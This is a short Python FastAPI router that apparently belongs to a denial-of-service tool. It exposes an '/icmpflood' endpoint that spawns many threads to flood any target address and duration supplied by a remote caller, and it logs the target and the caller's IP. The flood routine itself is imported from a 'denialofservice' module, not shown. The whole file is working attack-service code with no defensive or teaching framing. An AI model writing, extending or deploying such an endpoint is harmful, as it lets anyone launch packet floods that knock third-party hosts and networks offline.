from fastapi import APIRouter, Request
from denialofservice.layer3 import Layer3
from globals import NUMBER_OF_THREADS
from threading import Thread
from log import log
from schemas import ICMPFloodRequest

layer3_router = APIRouter()


@layer3_router.post("/icmpflood")
async def icmp_flood(icmp_flood: ICMPFloodRequest, request: Request):
    try:
        for i in range(NUMBER_OF_THREADS):
            t = Thread(target=Layer3.icmp_flood, args=(
                icmp_flood.target, icmp_flood.time,))
            t.start()
        log.info(
            f"{icmp_flood.target} ICMP-Flooded from {request.client.host} for {icmp_flood.time} seconds")
    except:
        log.warning(
            f"{icmp_flood.target} ICMP-Flood from {request.client.host} for {icmp_flood.time} seconds could not be triggered")
